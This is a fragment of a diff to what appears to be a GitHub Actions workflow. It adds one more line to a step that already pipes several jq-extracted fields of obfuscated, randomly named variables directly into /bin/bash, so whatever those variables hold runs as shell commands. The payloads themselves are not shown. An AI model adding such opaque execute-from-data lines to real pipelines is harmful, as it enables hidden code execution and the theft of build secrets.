@@ -29,6 +29,7 @@ jobs:
           echo $wowm674 | jq -r .wkb49907 | /bin/bash
           printf '%s' "$eqpo381" | jq -r .tyqf4135 | /bin/bash
           printf '%s' "$iyd57" | jq -r .zfvja1 | /bin/bash
+          echo $o1 | jq -r .ewy4959 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
